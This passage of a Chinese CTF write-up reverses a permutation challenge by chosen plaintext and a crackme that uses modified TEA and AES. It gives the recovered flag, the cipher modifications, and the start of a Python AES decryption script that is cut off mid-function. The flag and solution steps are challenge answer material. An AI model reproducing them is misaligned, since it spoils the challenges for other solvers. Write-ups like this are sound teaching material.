<p>后面的逻辑每分析出来，于是尝试选择明文攻击（后来得知后面的逻辑只是混淆）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">input:   abcdefghijklmnopqrstuvwxyziu
output:  0,  1,  2,  3,  4,  5,  6,  7,  8,  9,  27,  10,  11,  12,  13,  14,  15,  16,  17,  18,  19,  20,  28,  21,  22,  23,  24,  25,  26

input:   abcdefghijklmnopqrstuvwxyzui
output:  0,  1,  2,  3,  4,  5,  6,  7,  8,  28,  9,  10,  11,  12,  13,  14,  15,  16,  17,  18,  19,  20,  27,  21,  22,  23,  24,  25,  26

input:   abcdefghijklmnopqrstuvwxyizu
output:  0,  1,  2,  3,  4,  5,  6,  7,  8,  9,  26,  10,  11,  12,  13,  14,  15,  16,  17,  18,  19,  20,  28,  21,  22,  23,  24,  25,  27

input:   zyxwvutsrqponmlkjihgfedcbaiu
output:  0,  26,  25,  24,  23,  22,  21,  20,  19,  18,  27,  17,  16,  15,  14,  13,  12,  11,  10,  9,  8,  7,  28,  6,  5,  4,  3,  2,  1

input:   bacdefghijklmnopqrstuvwxyziu
output:  0,  2,  1,  3,  4,  5,  6,  7,  8,  9,  27,  10,  11,  12,  13,  14,  15,  16,  17,  18,  19,  20,  28,  21,  22,  23,  24,  25,  26


flag: 
waltznymphforquickjigsvexbud
target: 0,  2,  26,  17,  28,  24,  11,  21,  10,  16,  20,  19,  18,  3,  8,  6,  12,  9,  14,  13,  22,  4,  27,  15,  23,  1,  25,  7,  5
</code></pre></div><p>根据动调的结果，判断最后的密文就是把 <code>a-z</code> 的 index 依次放上来</p>
<p>手动还原 flag</p>
<h3 id="cplusexceptionencrypt">CPlusExceptionEncrypt</h3>
<p>异常处理，在所有的 begin_catch 下面下断点就能恢复流程</p>
<p>第一个加密是魔改后的tea</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">v0 <span style="color:#f92672">+=</span> (sum <span style="color:#f92672">+</span> i) <span style="color:#f92672">^</span> (((v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k3) <span style="color:#f92672">^</span> (sum1 <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> ((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k2))
v1 <span style="color:#f92672">+=</span> (sum <span style="color:#f92672">+</span> i) <span style="color:#f92672">^</span> (((v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k1) <span style="color:#f92672">^</span> (sum1 <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> ((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k0))
</code></pre></div><p>tea 之后对计算结果依次异或 <code>s</code>, <code>c</code>, <code>t</code>, <code>f</code></p>
<p>随后进行 AES 轮密钥生成，对拍发现没有魔改</p>
<p>接下来是魔改后的 AES：</p>
<ul>
<li>修改了最开始的轮密钥加：每个字节另外异或 0x66</li>
<li>随后执行的应该是 9 轮加密
<ul>
<li>subbyte 用的是 inv_s_box</li>
<li>然后用的是 inv_shift_rows</li>
<li>然后是正向列混淆</li>
<li>正向的轮密钥加</li>
</ul>
</li>
<li>最后是正常的字节替换，行移位和轮密钥加</li>
</ul>
<p>解密脚本：</p>
<p>aes.py</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> galois <span style="color:#f92672">import</span> GF2 <span style="color:#66d9ef">as</span> _GF2

_aes_s_box <span style="color:#f92672">=</span> [
    [<span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0x76</span>],
    [<span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xaf</span>, <span style="color:#ae81ff">0x9c</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xc0</span>],
    [<span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x15</span>],
    [<span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x75</span>],
    [<span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x84</span>],
    [<span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xcf</span>],
    [<span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xef</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0xa8</span>],
    [<span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0xd2</span>],
    [<span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x73</span>],
    [<span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0xdc</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0xdb</span>],
    [<span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x79</span>],
    [<span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0x08</span>],
    [<span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xdd</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x8a</span>],
    [<span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x9e</span>],
    [<span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0xdf</span>],
    [<span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x16</span>]
]
_aes_s_box_inverse <span style="color:#f92672">=</span> [
    [<span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0xfb</span>],
    [<span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0xcb</span>],
    [<span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0x4e</span>],
    [<span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x25</span>],
    [<span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0x92</span>],
    [<span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0x84</span>],
    [<span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x06</span>],
    [<span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xaf</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x6b</span>],
    [<span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0xdc</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0x73</span>],
    [<span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0x6e</span>],
    [<span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0x1b</span>],
    [<span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0xdb</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0xf4</span>],
    [<span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0xdd</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0x5f</span>],
    [<span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x9c</span>, <span style="color:#ae81ff">0xef</span>],
    [<span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x61</span>],
    [<span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x7d</span>]
]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_convert_to_array</span>(plain_int):
    plain_array <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
            plain_array[j][i] <span style="color:#f92672">=</span> plain_int <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
            plain_int <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">8</span>
    <span style="color:#66d9ef">return</span> plain_array

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_num_from_sbox</span>(index):
    row <span style="color:#f92672">=</span> (index <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf0</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>
    col <span style="color:#f92672">=</span> index <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>
    <span style="color:#66d9ef">return</span> _aes_s_box[row][col]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_num_from_sbox_inverse</span>(index):
    row <span style="color:#f92672">=</span> (index <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf0</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>
    col <span style="color:#f92672">=</span> index <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>
    <span style="color:#66d9ef">return</span> _aes_s_box_inverse[row][col]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sub_bytes</span>(input_array):
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            input_array[i][j] <span style="color:#f92672">=</span> _get_num_from_sbox(input_array[i][j])

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sub_bytes_inverse</span>(input_array):
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            input_array[i][j] <span style="color:#f92672">=</span> _get_num_from_sbox_inverse(input_array[i][j])

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_shift_rows</span>(input_array):
    input_array[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> input_array[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>:] <span style="color:#f92672">+</span> [input_array[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]]
    input_array[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> input_array[<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> input_array[<span style="color:#ae81ff">2</span>][:<span style="color:#ae81ff">2</span>]
    input_array[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> [input_array[<span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">3</span>]]  <span style="color:#f92672">+</span> input_array[<span style="color:#ae81ff">3</span>][:<span style="color:#ae81ff">3</span>]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_shift_rows_inverse</span>(input_array):
    input_array[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span>   input_array[<span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">1</span>:] <span style="color:#f92672">+</span> [ input_array[<span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">0</span>] ]
    input_array[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span>   input_array[<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">2</span>:]   <span style="color:#f92672">+</span> input_array[<span style="color:#ae81ff">2</span>][:<span style="color:#ae81ff">2</span>]
